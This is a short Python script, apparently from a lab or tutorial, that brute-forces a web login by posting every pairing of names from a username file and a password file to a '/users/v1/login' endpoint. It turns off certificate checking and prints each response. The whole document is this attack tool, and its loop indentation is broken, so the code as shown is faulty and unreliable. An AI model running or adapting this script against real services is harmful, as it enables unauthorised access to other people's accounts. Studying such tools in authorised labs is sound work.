         import requests
         import time

         host = 'http://<HOST_UP>'
         file1 = open('./passwordlist.txt', 'r')
         file2 = open('./loginusernames.txt', 'r')
         PasswordList = file1.read().splitlines()
         LoginUserList = file2.read().splitlines()

         count = 0
         for username in LoginUserList:
         for password in PasswordList:
                 count += 1
                 r = requests.post(host + '/users/v1/login', json={"username": username, "password": password}, verify=False)
                 time.sleep(0.1)
                 print(username + ':' + password + ' | ' + str(r.json()))